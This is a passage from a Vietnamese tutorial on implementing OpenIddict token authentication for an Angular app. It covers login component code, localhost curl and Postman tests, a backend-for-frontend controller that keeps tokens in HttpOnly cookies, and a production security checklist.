import { ReactiveFormsModule, FormBuilder, FormGroup, Validators } from '@angular/forms';
import { Router, ActivatedRoute } from '@angular/router';
import { AuthService } from '../../../core/auth/auth.service';

@Component({
  selector: 'app-login',
  standalone: true,
  imports: [CommonModule, ReactiveFormsModule],
  templateUrl: './login.component.html',
  styleUrls: ['./login.component.scss']
})
export class LoginComponent {
  loginForm: FormGroup;
  
  // Signals cho reactive state management
  isLoading = signal(false);
  errorMessage = signal<string | null>(null);
  
  private returnUrl: string;

  constructor(
    private fb: FormBuilder,
    private authService: AuthService,
    private router: Router,
    private route: ActivatedRoute
  ) {
    // Reactive Form với validation
    this.loginForm = this.fb.group({
      username: ['', [
        Validators.required,
        Validators.minLength(3)
      ]],
      password: ['', [
        Validators.required,
        Validators.minLength(8)
      ]]
    });

    // Lấy returnUrl từ query param (nếu guard redirect về login)
    this.returnUrl = this.route.snapshot.queryParams['returnUrl'] || '/dashboard';
    
    // Nếu đã đăng nhập rồi → redirect thẳng
    if (this.authService.isAuthenticated()) {
      this.router.navigate([this.returnUrl]);
    }
  }

  onSubmit(): void {
    if (this.loginForm.invalid) {
      // Mark tất cả fields là touched để hiển thị validation errors
      this.loginForm.markAllAsTouched();
      return;
    }

    this.isLoading.set(true);
    this.errorMessage.set(null);

    const { username, password } = this.loginForm.value;

    this.authService.login(username, password).subscribe({
      next: (user) => {
        // Đăng nhập thành công → redirect về returnUrl
        this.router.navigate([this.returnUrl]);
      },
      error: (error: string) => {
        this.isLoading.set(false);
        this.errorMessage.set(error);
        // Xóa password field sau khi sai — bảo mật tốt hơn
        this.loginForm.patchValue({ password: '' });
      },
      complete: () => {
        this.isLoading.set(false);
      }
    });
  }

  // Helpers để template truy cập form controls dễ hơn
  get usernameControl() { return this.loginForm.get('username')!; }
  get passwordControl() { return this.loginForm.get('password')!; }
}
```

### 11.4 Login Template

```html
<!-- features/auth/login/login.component.html -->

<div class="login-container">
  <div class="login-card">
    <h2>Đăng nhập hệ thống</h2>

    <!-- Error message từ server -->
    @if (errorMessage()) {
      <div class="alert alert-error" role="alert">
        {{ errorMessage() }}
      </div>
    }

    <form [formGroup]="loginForm" (ngSubmit)="onSubmit()" novalidate>
      
      <!-- Username field -->
      <div class="form-group">
        <label for="username">Tên đăng nhập hoặc Email</label>
        <input
          id="username"
          type="text"
          formControlName="username"
          autocomplete="username"
          [class.is-invalid]="usernameControl.invalid && usernameControl.touched"
          placeholder="Nhập username hoặc email"
        />
        @if (usernameControl.invalid && usernameControl.touched) {
          <span class="error-text">
            @if (usernameControl.errors?.['required']) { Vui lòng nhập username. }
            @if (usernameControl.errors?.['minlength']) { Tối thiểu 3 ký tự. }
          </span>
        }
      </div>

      <!-- Password field -->
      <div class="form-group">
        <label for="password">Mật khẩu</label>
        <input
          id="password"
          type="password"
          formControlName="password"
          autocomplete="current-password"
          [class.is-invalid]="passwordControl.invalid && passwordControl.touched"
          placeholder="Nhập mật khẩu"
        />
        @if (passwordControl.invalid && passwordControl.touched) {
          <span class="error-text">
            @if (passwordControl.errors?.['required']) { Vui lòng nhập mật khẩu. }
            @if (passwordControl.errors?.['minlength']) { Tối thiểu 8 ký tự. }
          </span>
        }
      </div>

      <!-- Submit button -->
      <button
        type="submit"
        class="btn-login"
        [disabled]="isLoading()"
      >
        @if (isLoading()) {
          <span>Đang đăng nhập...</span>
        } @else {
          <span>Đăng nhập</span>
        }
      </button>

    </form>
  </div>
</div>
```

### 11.5 Environment config

```typescript
// environments/environment.ts (Development)
export const environment = {
  production: false,
  apiUrl: 'http://localhost:5000',  // Backend URL
};

// environments/environment.prod.ts (Production)
export const environment = {
  production: true,
  apiUrl: 'https://api.yourdomain.gov.vn',  // Thay bằng domain thật
  // KHÔNG đặt secret ở đây
};
```

---

## 12. Chạy thử & Test

### 12.1 Chạy Backend

```bash
cd AuthDemo.Api

# Chạy ở môi trường Development
dotnet run

# Output mong đợi:
# info: Microsoft.Hosting.Lifetime[14]
#       Now listening on: https://localhost:7000
#       Now listening on: http://localhost:5000
# info: AuthDemo.Api.Services.WorkerService[0]
#       Đã tạo OpenIddict Application: angular-spa
# warn: AuthDemo.Api.Services.WorkerService[0]
#       Đã tạo user admin mặc định: admin@demo.local — HÃY ĐỔI MẬT KHẨU...
```

### 12.2 Test với curl

```bash
# TEST 1: Đăng nhập lấy token
curl -X POST http://localhost:5000/connect/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&username=admin@demo.local&password=Admin@123456&client_id=angular-spa&client_secret=your-super-secret-key-change-in-production&scope=openid profile email roles"

# Response mong đợi:
# {
#   "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6ImF0K0pXVCJ9...",
#   "token_type": "Bearer",
#   "expires_in": 3600,
#   "refresh_token": "...",
#   "scope": "openid profile email roles"
# }

# TEST 2: Gọi API được bảo vệ với token
# Thay <ACCESS_TOKEN> bằng token thật từ bước trên
curl -X GET http://localhost:5000/api/api/me \
  -H "Authorization: Bearer <ACCESS_TOKEN>"

# Response mong đợi:
# {
#   "userId": "...",
#   "userName": "admin@demo.local",
#   "email": "admin@demo.local",
#   "fullName": "System Administrator",
#   "roles": ["Admin"]
# }

# TEST 3: Gọi API public (không cần token)
curl -X GET http://localhost:5000/api/api/public

# TEST 4: Gọi API admin với user không có role Admin → 403
curl -X GET http://localhost:5000/api/api/admin-only \
  -H "Authorization: Bearer <TOKEN_OF_NON_ADMIN_USER>"

# TEST 5: Refresh token
curl -X POST http://localhost:5000/connect/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=refresh_token&refresh_token=<REFRESH_TOKEN>&client_id=angular-spa&client_secret=your-super-secret-key-change-in-production"

# TEST 6: Logout (revoke token)
curl -X POST http://localhost:5000/connect/logout \
  -H "Authorization: Bearer <ACCESS_TOKEN>"
```

### 12.3 Chạy Frontend

```bash
cd auth-demo

# Chạy Angular dev server
ng serve

# Mở browser: http://localhost:4200
# Login với: admin@demo.local / Admin@123456
```

### 12.3b Test Refresh Token với Postman (RefreshTokenCookieMiddleware)

> **Lưu ý quan trọng:** Dự án dùng `RefreshTokenCookieMiddleware` nên `refresh_token` không xuất hiện trong response body — thay vào đó nó được set vào HttpOnly Cookie.

#### Tại sao Postman không thấy `refresh_token` trong response?

```
Luồng bình thường (không có middleware):
  POST /connect/token → Response: { access_token, refresh_token, expires_in }

Luồng với RefreshTokenCookieMiddleware:
  POST /connect/token → Middleware bắt response
                       → Lấy refresh_token ra khỏi JSON
                       → Set vào HTTP header: Set-Cookie: refresh_token=...; HttpOnly
                       → Trả response: { access_token, expires_in }  ← không có refresh_token
```

Cookie nằm ở **browser/Postman** (client), không phải server. Server chỉ ra lệnh "hãy lưu cookie này" qua header `Set-Cookie`.

#### Cách test đúng trong Postman:

**Bước 1 — Login và kiểm tra cookie:**
```
POST http://localhost:5000/connect/token
Content-Type: application/x-www-form-urlencoded

grant_type=password
username=admin@demo.local
password=Admin@123456
client_id=angular-spa
```

Sau khi nhận response 200:
- Tab **Body**: chỉ thấy `access_token`, `token_type`, `expires_in` → đúng, không có `refresh_token`
- Tab **Cookies**: thấy cookie `refresh_token` đã được set với `HttpOnly` flag ✓

**Bước 2 — Refresh token (Postman tự gửi cookie):**
```
POST http://localhost:5000/connect/token
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token
client_id=angular-spa
```

> Không cần truyền `refresh_token` trong body — Postman tự đính kèm cookie từ bước 1.
> Middleware sẽ đọc cookie và inject vào form body trước khi OpenIddict validate.

**Nếu Postman không tự gửi cookie:** Vào **Cookies** → thêm thủ công domain `localhost` và giá trị cookie.

#### Cách Angular dùng refresh token (không cần biết giá trị token):

```typescript
// Angular gọi refresh — KHÔNG truyền refresh_token trong body
// Browser engine tự đính kèm HttpOnly cookie
refreshToken(): Observable<TokenResponse> {
  const body = new HttpParams()
    .set('grant_type', 'refresh_token')
    .set('client_id', 'angular-spa');

  return this.http.post<TokenResponse>('/connect/token', body.toString(), {
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    withCredentials: true,  // ← BẮT BUỘC: cho phép browser gửi cookie cross-origin
  });
}

// Angular chỉ nhận lại access_token mới trong response body
// refresh_token mới được server tự động set lại vào cookie (rotation)
// Angular không bao giờ đọc được giá trị refresh_token — đây là MỤC ĐÍCH thiết kế
```

#### Kiểm tra cookie trong DevTools browser:

```
DevTools → Application → Storage → Cookies → http://localhost:4200

Tên           | Giá trị    | HttpOnly | Secure | SameSite | Path
refresh_token | [ẩn]       | ✓        | (dev)  | Strict   | /connect/token

→ Cột "HttpOnly" = ✓ nghĩa là document.cookie sẽ không thấy cookie này
→ Browser vẫn tự gửi khi request đến đúng path
```

---

### 12.4 Test bảo mật XSS cơ bản

```javascript
// Mở DevTools Console trong browser sau khi đăng nhập
// Thử đọc localStorage → không có gì (đúng!)
localStorage.getItem('access_token')   // → null

// Token chỉ sống trong JavaScript heap của AuthService
// Attacker inject XSS cũng không đọc được từ localStorage/sessionStorage
// Nhưng vẫn có thể gọi authService.getAccessToken() nếu có thể inject code
// → Đây là lý do cần CSP header để ngăn inline script injection

// Kiểm tra DevTools → Application → Cookies
// Nếu cấu hình đúng, sẽ thấy HttpOnly cookie không đọc được từ JS
```

---

## 13. Nâng cấp bảo mật — BFF Pattern

> **Áp dụng cho Cấp 3+ (hệ thống nhà nước có dữ liệu nhạy cảm)**

### Vấn đề của cách tiếp cận hiện tại

```
HIỆN TẠI (SPA trực tiếp gọi API):
Browser (Angular) → POST /connect/token → nhận token → lưu trong JS memory
                  → GET /api/* với Bearer token trong header

VẤN ĐỀ:
- client_secret lộ trong JS bundle (browser có thể xem)
- Access token tồn tại trong JS heap → bị đọc nếu có XSS
- Mọi JS trên page đều có thể gọi authService nếu chạy trong cùng context
```

### BFF — Backend For Frontend Pattern

```
VỚI BFF:
Browser (Angular) → POST /bff/login (chỉ gửi username/password)
                                          ↓
                             BFF Server (ASP.NET)
                             - Gọi /connect/token với client_secret (server-side, an toàn)
                             - Nhận token từ Auth Server
                             - Set token vào HttpOnly cookie
                             - Trả về 200 OK (không trả token về browser)
                                          ↓
Browser → GET /api/products (tự động gửi HttpOnly cookie)
                                          ↓
                             BFF Server
                             - Đọc token từ HttpOnly cookie
                             - Forward request đến API với Bearer token
                             - Trả về response cho browser

KẾT QUẢ:
- client_secret chỉ ở server → không bao giờ lộ ra browser
- Access token chỉ ở server → XSS trong browser không đọc được
- Browser chỉ có HttpOnly cookie → JS không đọc được
```

### BFF Controller mẫu

```csharp
// Controllers/BffController.cs — Thêm vào backend

[ApiController]
[Route("bff")]
public class BffController : ControllerBase
{
    private readonly IHttpClientFactory _httpClientFactory;
    private readonly IConfiguration _config;

    public BffController(IHttpClientFactory httpClientFactory, IConfiguration config)
    {
        _httpClientFactory = httpClientFactory;
        _config = config;
    }

    [HttpPost("login")]
    public async Task<IActionResult> Login([FromBody] BffLoginRequest request)
    {
        // Gọi OpenIddict token endpoint từ server (client_secret an toàn ở đây)
        var client = _httpClientFactory.CreateClient();
        
        var formData = new Dictionary<string, string>
        {
            ["grant_type"] = "password",
            ["username"] = request.Username,
            ["password"] = request.Password,
            ["client_id"] = "angular-spa",
            ["client_secret"] = _config["OpenIddict:ClientSecret"]!, // Đọc từ Secret Vault
            ["scope"] = "openid profile email roles"
        };

        var response = await client.PostAsync(
            "http://localhost:5000/connect/token",
            new FormUrlEncodedContent(formData));

        if (!response.IsSuccessStatusCode)
        {
            return Unauthorized(new { message = "Username hoặc mật khẩu không đúng." });
        }

        var tokenResponse = await response.Content.ReadFromJsonAsync<TokenResponse>();

        // Set access token vào HttpOnly cookie — JavaScript không đọc được
        Response.Cookies.Append("access_token", tokenResponse!.AccessToken, new CookieOptions
        {
            HttpOnly = true,     // JS không đọc được
            Secure = true,       // Chỉ gửi qua HTTPS
            SameSite = SameSiteMode.Strict, // Chỉ gửi từ cùng site (chặn CSRF)
            Expires = DateTimeOffset.UtcNow.AddSeconds(tokenResponse.ExpiresIn),
            Path = "/api"        // Chỉ gửi cookie khi request đến /api/*
        });

        // Set refresh token riêng với thời gian dài hơn
        if (tokenResponse.RefreshToken != null)
        {
            Response.Cookies.Append("refresh_token", tokenResponse.RefreshToken, new CookieOptions
            {
                HttpOnly = true,
                Secure = true,
                SameSite = SameSiteMode.Strict,
                Expires = DateTimeOffset.UtcNow.AddDays(14),
                Path = "/bff/refresh" // Chỉ gửi khi gọi refresh endpoint
            });
        }

        // KHÔNG trả token về browser
        return Ok(new { message = "Đăng nhập thành công." });
    }

    [HttpPost("refresh")]
    public async Task<IActionResult> Refresh()
    {
        // Đọc refresh token từ HttpOnly cookie
        var refreshToken = Request.Cookies["refresh_token"];
        if (string.IsNullOrEmpty(refreshToken))
            return Unauthorized();

        // Gọi token endpoint từ server
        var client = _httpClientFactory.CreateClient();
        var formData = new Dictionary<string, string>
        {
            ["grant_type"] = "refresh_token",
            ["refresh_token"] = refreshToken,
            ["client_id"] = "angular-spa",
            ["client_secret"] = _config["OpenIddict:ClientSecret"]!
        };

        var response = await client.PostAsync(
            "http://localhost:5000/connect/token",
            new FormUrlEncodedContent(formData));

        if (!response.IsSuccessStatusCode)
        {
            // Refresh token expired → xóa cookie, yêu cầu login lại
            Response.Cookies.Delete("access_token");
            Response.Cookies.Delete("refresh_token");
            return Unauthorized();
        }

        var tokenResponse = await response.Content.ReadFromJsonAsync<TokenResponse>();

        // Set access token mới vào cookie
        Response.Cookies.Append("access_token", tokenResponse!.AccessToken, new CookieOptions
        {
            HttpOnly = true, Secure = true, SameSite = SameSiteMode.Strict,
            Expires = DateTimeOffset.UtcNow.AddSeconds(tokenResponse.ExpiresIn),
            Path = "/api"
        });

        return Ok(new { message = "Token đã được làm mới." });
    }
}
```

---

## 14. Checklist Production

### Backend

- [ ] Thay `AddEphemeralEncryptionKey/SigningKey` bằng certificate thật (RSA 2048+)
- [ ] Đổi `ClientSecret` trong WorkerService sang giá trị ngẫu nhiên, đọc từ Secret Vault
- [ ] Đổi `client_secret` trong Angular sang giá trị tương ứng
- [ ] Xóa `EnableSensitiveDataLogging()` trong DbContext
- [ ] Tắt `DisableTransportSecurityRequirement()` trong OpenIddict
- [ ] Set `AccessTokenLifetime` = 15–30 phút (không phải 60 phút)
- [ ] Tắt Swagger UI ở production
- [ ] Thay `WithOrigins` bằng domain production thật
- [ ] Đổi mật khẩu admin mặc định `Admin@123456`
- [ ] Cấu hình Serilog sink ra ELK/SIEM (không chỉ Console)
- [ ] Bật `RequireConfirmedEmail = true` nếu cần
- [ ] Xem xét bật `options.RequireProofKeyForCodeExchange()` nếu chuyển sang Authorization Code + PKCE

### Frontend

- [ ] Đảm bảo `environment.prod.ts` không chứa secret
- [ ] `ng build --configuration=production` — kiểm tra không có source maps
- [ ] Kiểm tra `client_secret` không hard-code trong bundle dễ thấy (đây là known limitation của ROPC flow)
- [ ] CSP header đúng từ Nginx/IIS để ngăn XSS injection
- [ ] `withCredentials: true` trên mọi request cần cookie (nếu dùng BFF)
- [ ] Kiểm tra logout có gọi server-side revoke không

### Hạ tầng

- [ ] Nginx với TLS 1.2+ và security headers đầy đủ
- [ ] Chứng thư số từ CA hợp lệ (không self-signed)
- [ ] Reverse proxy ở phía trước — không expose Kestrel trực tiếp
- [ ] Rate limiting ở Nginx hoặc app cho /connect/token (max 10 req/phút/IP)
- [ ] Firewall: chỉ mở 443

---

## Tóm tắt và Lời khuyên cuối

### Câu trả lời thẳng cho câu hỏi bảo mật JWT localStorage

> **localStorage có handle được bảo mật không?**
>
> **KHÔNG** — nếu hệ thống của bạn có XSS vulnerability (dù nhỏ), kẻ tấn công có thể đọc token và mạo danh user hoàn toàn. Với hệ thống nhà nước có dữ liệu cá nhân, điều này vi phạm yêu cầu ATTT Cấp 2+.
>
> **Giải pháp theo thứ tự ưu tiên:**
> 1. **BFF + HttpOnly Cookie** (Cấp 3+): Tốt nhất, JS không thể đọc token
> 2. **In-Memory + HttpOnly Cookie cho refresh** (Cấp 2+): Tốt, đơn giản hơn BFF
> 3. **sessionStorage** (Cấp 1-2): Chấp nhận được, vẫn XSS vulnerable nhưng tự xóa khi đóng tab
> 4. **localStorage**: Chỉ cho prototype/demo nội bộ

### OpenIddict so với tự viết JWT

> **Dùng OpenIddict** vì:
> - Token revocation built-in (logout thật sự, không phải client-side)
> - Refresh token rotation (phát mới mỗi lần refresh, ngăn token replay)
> - Chuẩn OAuth2/OIDC → dễ tích hợp với SSO sau này
> - Audit trail đầy đủ trong database

---

*Tài liệu này dùng cho mục đích thực hành. Trước khi đưa vào production cho hệ thống nhà nước, đảm bảo đã review toàn bộ phần bảo mật và tuân thủ Thông tư 12/2022/TT-BTTTT.*
